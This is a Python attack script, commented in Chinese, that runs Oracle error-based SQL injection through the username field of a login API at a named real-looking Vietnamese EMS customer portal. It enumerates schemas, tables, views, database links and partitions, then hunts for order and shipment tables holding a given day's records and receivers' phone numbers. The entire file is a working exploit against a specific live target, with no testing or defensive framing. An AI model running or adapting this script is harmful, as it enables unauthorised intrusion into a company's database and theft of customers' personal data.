#!/usr/bin/env python3
"""
深度挖掘数据库 - 找出所有订单相关的数据
"""

import requests
import json
import time

class DatabaseMiner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def find_all_schemas(self):
        """查找所有可访问的schema"""
        print("=" * 80)
        print("🗄️  第1步: 枚举所有可访问的Schema")
        print("=" * 80)
        
        print("\n🔎 查找所有schema:")
        for i in range(1, 15):
            query = f"SELECT USERNAME FROM (SELECT USERNAME, ROWNUM AS RN FROM ALL_USERS ORDER BY USERNAME) WHERE RN={i}"
            schema = self.extract_via_error(query)
            if schema:
                print(f"   {i}. {schema}")
            time.sleep(1)
    
    def find_all_ems_tables(self):
        """枚举EMS schema下所有表"""
        print("\n" + "=" * 80)
        print("📋 第2步: 枚举EMS schema下的所有表")
        print("=" * 80)
        
        print("\n🔎 EMS schema下的所有表（前50个）:")
        for i in range(1, 51):
            query = f"SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RN FROM ALL_TABLES WHERE OWNER='EMS' ORDER BY TABLE_NAME) WHERE RN={i}"
            table = self.extract_via_error(query)
            if table:
                print(f"   {i:2}. {table}")
            time.sleep(0.8)
    
    def find_large_tables(self):
        """查找数据量大的表"""
        print("\n" + "=" * 80)
        print("📊 第3步: 查找数据量最大的表（EMS schema）")
        print("=" * 80)
        
        # 检查一些可能的大表
        possible_tables = [
            "SHIPMENT", "E1E2_PH", "E1E2_PH_LOG", "E1E2_PH_TEMP_DATA2_LOG",
            "ORDER", "ORDERS", "SALES_ORDER", "DONHANG", "BILL",
            "TRANSACTION", "E1_SMS", "E2_SMS", "DELIVERY", "PACKAGE",
            "WAYBILL", "CONSIGNMENT", "PARCEL", "CARGO"
        ]
        
        print("\n🔎 检查常见订单表的记录数:")
        found_tables = []
        
        for table_name in possible_tables:
            query = f"SELECT COUNT(*) FROM EMS.{table_name} WHERE ROWNUM<=100000"
            count = self.extract_via_error(query)
            if count and count != 'ORA':
                print(f"   ✅ EMS.{table_name:30} : {count:>10} 条")
                if count.isdigit() and int(count) > 1000:
                    found_tables.append(table_name)
            time.sleep(1)
        
        return found_tables
    
    def check_table_with_today_data(self, table_name):
        """检查表中是否有今天的数据"""
        date = '20251010'
        
        # 尝试不同的日期字段
        date_fields = ['NGAY', 'CREATE_DATE', 'ORDER_DATE', 'SHIP_DATE', 
                       'DATE_LOG', 'CREATED_DATE', 'INSERT_DATE']
        
        for field in date_fields:
            query = f"SELECT COUNT(*) FROM EMS.{table_name} WHERE {field}='{date}'"
            count = self.extract_via_error(query)
            if count and count.isdigit() and int(count) > 0:
                return (field, count)
            time.sleep(0.5)
        
        return (None, 0)
    
    def deep_analyze_each_table(self, tables):
        """深度分析每个表"""
        print("\n" + "=" * 80)
        print("🔬 第4步: 深度分析每个大表的10月10日数据")
        print("=" * 80)
        
        date = '20251010'
        
        for table_name in tables:
            print(f"\n{'='*80}")
            print(f"📊 分析表: EMS.{table_name}")
            print(f"{'='*80}")
            
            # 查找日期字段和数据
            field, count = self.check_table_with_today_data(table_name)
            
            if field and int(count) > 0:
                print(f"   ✅ 找到今日数据！")
                print(f"   日期字段: {field}")
                print(f"   记录数: {count}")
                
                # 检查是否有主键字段
                key_fields = ['CODE', 'MABC', 'ID', 'ORDER_ID', 'SHIPMENT_ID', 
                             'BILL_NO', 'WAYBILL_NO']
                
                for key_field in key_fields:
                    query = f"SELECT COUNT(DISTINCT {key_field}) FROM EMS.{table_name} WHERE {field}='{date}'"
                    unique_count = self.extract_via_error(query)
                    if unique_count and unique_count.isdigit() and int(unique_count) > 0:
                        print(f"   不同{key_field}数: {unique_count}")
                        time.sleep(0.8)
                
                # 检查是否有电话字段
                phone_fields = ['PHONE', 'RECEIVER_PHONE', 'DIENTHOAINHAN', 
                               'MOBILE', 'TEL', 'CONTACT']
                
                for phone_field in phone_fields:
                    query = f"SELECT COUNT(*) FROM EMS.{table_name} WHERE {field}='{date}' AND {phone_field} IS NOT NULL AND ROWNUM<=1000"
                    phone_count = self.extract_via_error(query)
                    if phone_count and phone_count.isdigit() and int(phone_count) > 0:
                        print(f"   有{phone_field}的: {phone_count}条")
                        time.sleep(0.8)
            else:
                print(f"   ❌ 未找到10月10日数据")
            
            time.sleep(1)
    
    def check_partitions(self):
        """检查分区表的分区情况"""
        print("\n" + "=" * 80)
        print("🗂️  第5步: 检查分区表的分区情况")
        print("=" * 80)
        
        # 查找所有分区表
        print("\n🔎 查找EMS schema的分区表:")
        for i in range(1, 10):
            query = f"SELECT TABLE_NAME FROM (SELECT DISTINCT TABLE_NAME, ROWNUM AS RN FROM ALL_TAB_PARTITIONS WHERE TABLE_OWNER='EMS') WHERE RN={i}"
            table = self.extract_via_error(query)
            if table:
                print(f"   {i}. {table}")
                
                # 查询这个表的分区数
                query2 = f"SELECT COUNT(*) FROM ALL_TAB_PARTITIONS WHERE TABLE_NAME='{table}' AND TABLE_OWNER='EMS'"
                part_count = self.extract_via_error(query2)
                if part_count:
                    print(f"      分区数: {part_count}")
                
                time.sleep(1)
    
    def check_views(self):
        """检查视图"""
        print("\n" + "=" * 80)
        print("👁️  第6步: 检查EMS的视图")
        print("=" * 80)
        
        print("\n🔎 查找包含ORDER/SHIPMENT的视图:")
        for i in range(1, 15):
            query = f"SELECT VIEW_NAME FROM (SELECT VIEW_NAME, ROWNUM AS RN FROM ALL_VIEWS WHERE OWNER='EMS' AND (VIEW_NAME LIKE '%ORDER%' OR VIEW_NAME LIKE '%SHIP%' OR VIEW_NAME LIKE '%E1%')) WHERE RN={i}"
            view = self.extract_via_error(query)
            if view:
                print(f"   {i}. {view}")
            time.sleep(1)
    
    def check_synonyms(self):
        """检查同义词"""
        print("\n" + "=" * 80)
        print("🔗 第7步: 检查同义词（可能指向其他表）")
        print("=" * 80)
        
        print("\n🔎 查找EMS的同义词:")
        for i in range(1, 10):
            query = f"SELECT SYNONYM_NAME FROM (SELECT SYNONYM_NAME, ROWNUM AS RN FROM ALL_SYNONYMS WHERE OWNER='EMS') WHERE RN={i}"
            synonym = self.extract_via_error(query)
            if synonym:
                print(f"   {i}. {synonym}")
            time.sleep(1)
    
    def check_other_schemas_with_orders(self):
        """检查其他schema是否有订单数据"""
        print("\n" + "=" * 80)
        print("🔍 第8步: 检查其他schema的订单表")
        print("=" * 80)
        
        # 检查一些可能的schema
        schemas = ['VNPE', 'BCCP', 'BCCPCOM', 'EMS_ONLINE', 'EMS_WEB', 
                  'CUSTOMER', 'ORDER_SYS', 'LOGISTICS']
        
        for schema in schemas:
            print(f"\n🔎 检查 {schema} schema:")
            
            # 检查是否有SHIPMENT表
            query1 = f"SELECT COUNT(*) FROM {schema}.SHIPMENT WHERE ROWNUM<=1000"
            count1 = self.extract_via_error(query1)
            if count1 and count1.isdigit():
                print(f"   ✅ {schema}.SHIPMENT 存在: {count1}条")
            
            # 检查是否有E1E2_PH表
            query2 = f"SELECT COUNT(*) FROM {schema}.E1E2_PH WHERE ROWNUM<=1000"
            count2 = self.extract_via_error(query2)
            if count2 and count2.isdigit():
                print(f"   ✅ {schema}.E1E2_PH 存在: {count2}条")
            
            time.sleep(1)
    
    def check_dblinks(self):
        """检查数据库链接（可能连接到其他系统）"""
        print("\n" + "=" * 80)
        print("🔗 第9步: 检查数据库链接")
        print("=" * 80)
        
        print("\n🔎 查找数据库链接:")
        for i in range(1, 10):
            query = f"SELECT DB_LINK FROM (SELECT DB_LINK, ROWNUM AS RN FROM ALL_DB_LINKS) WHERE RN={i}"
            dblink = self.extract_via_error(query)
            if dblink:
                print(f"   {i}. {dblink}")
            time.sleep(1)
    
    def find_related_tables_by_structure(self):
        """通过表结构查找相关表"""
        print("\n" + "=" * 80)
        print("🏗️  第10步: 通过字段结构查找订单相关表")
        print("=" * 80)
        
        # 查找包含特定字段的表
        key_columns = ['RECEIVER_PHONE', 'DIENTHOAINHAN', 'CUSTOMER_CODE', 
                      'ORDER_CODE', 'MABC', 'BILL_NO']
        
        for col in key_columns:
            print(f"\n🔎 查找包含字段 '{col}' 的表:")
            for i in range(1, 6):
                query = f"SELECT TABLE_NAME FROM (SELECT DISTINCT TABLE_NAME, ROWNUM AS RN FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND COLUMN_NAME='{col}') WHERE RN={i}"
                table = self.extract_via_error(query)
                if table:
                    print(f"   {i}. {table}")
                time.sleep(0.8)
    
    def run_deep_mining(self):
        """执行完整的深度挖掘"""
        print("=" * 80)
        print("⛏️  数据库深度挖掘工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行所有挖掘步骤
        self.find_all_schemas()
        self.find_all_ems_tables()
        large_tables = self.find_large_tables()
        self.deep_analyze_each_table(large_tables)
        self.check_partitions()
        self.check_views()
        self.find_related_tables_by_structure()
        self.check_synonyms()
        self.check_other_schemas_with_orders()
        self.check_dblinks()
        
        print("\n" + "=" * 80)
        print("🎉 深度挖掘完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    miner = DatabaseMiner(target_url)
    miner.run_deep_mining()
